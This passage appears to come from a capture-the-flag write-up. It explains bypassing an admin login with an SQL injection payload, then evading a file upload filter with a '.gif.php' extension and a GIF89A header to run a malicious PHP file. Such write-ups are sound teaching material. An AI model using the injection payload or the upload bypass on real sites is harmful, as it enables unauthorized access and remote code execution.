panel]


## How to Solve?
First we need to bypass the admin panel by using SQL injection payload, here is the payload I used

```
Username: admin' or true-- -
Password: testtttttttttttttt
```

After that we will see find a file upload functionaility where we can upload an image there

Upload File]


We need to do `Remote Code Execution` by uploading a malicious PHP file. But there is some filter, the website will check the extension of the file, and the header of the file. But we can bypass it by using `.gif.php` extension and add `GIF89A` as a file header
